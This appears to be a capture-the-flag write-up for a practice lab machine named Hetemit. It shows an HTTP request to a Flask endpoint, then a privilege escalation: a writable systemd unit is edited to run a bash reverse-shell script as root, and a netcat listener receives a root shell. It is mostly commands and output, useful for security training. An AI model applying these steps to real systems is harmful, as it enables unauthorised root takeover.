## Notes

A successful POST request to /generate

```text
POST /generate HTTP/1.1
Host: 192.168.197.117:50000
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 23

email=attacker@kali.com
```

This gives

```text
HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 64
Server: Werkzeug/1.0.1 Python/3.6.8
Date: Sat, 12 Jun 2021 05:20:40 GMT

c9c67a56b3fda3fc32c4887f21937aa7122f13fc9cb47c465843f0a065c470a0
```

## Post-exploitation

From linpeas

```text
[+] Permissions in init, init.d, systemd, and rc.d
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#init-init-d-systemd-and-rc-d
You have write privileges over /etc/systemd/system/pythonapp.service

cmeeks@hetemit ~/register_hetemit/config$ ls -lah /etc/systemd/system/pythonapp.service
-rw-rw-r-- 1 root cmeeks 302 Nov 13  2020 /etc/systemd/system/pythonapp.service
```

We check it out

```text
cmeeks@hetemit ~/register_hetemit/config$ cat /etc/systemd/system/pythonapp.service
[Unit]
Description=Python App
After=network-online.target

[Service]
Type=simple
WorkingDirectory=/home/cmeeks/restjson_hetemit
ExecStart=flask run -h 0.0.0.0 -p 50000
TimeoutSec=30
RestartSec=15s
User=cmeeks
ExecReload=/bin/kill -USR1 $MAINPID
Restart=on-failure

[Install]
WantedBy=multi-user.target
```

We change it to this, where service.sh is bash reverse shell. Only minimal editing works

```text
[cmeeks@hetemit ~]$ cat /etc/systemd/system/pythonapp.service
[Unit]
Description=Python App
After=network-online.target

[Service]
Type=simple
WorkingDirectory=/home/cmeeks/tmp
ExecStart=/home/cmeeks/tmp/service.sh
TimeoutSec=30
RestartSec=15s
User=root
ExecReload=/bin/kill -USR1 $MAINPID
Restart=on-failure

[Install]
WantedBy=multi-user.target
```

After reboot, root shell

```text
root@kali:~/CTF/PGPractice/Hetemit/PE# nc -nlvp 18000
listening on [any] 18000 ...
connect to [192.168.49.197] from (UNKNOWN) [192.168.197.117] 52066
bash: cannot set terminal process group (1249): Inappropriate ioctl for device
bash: no job control in this shell
[root@hetemit tmp]# id
id
uid=0(root) gid=0(root) groups=0(root)
```

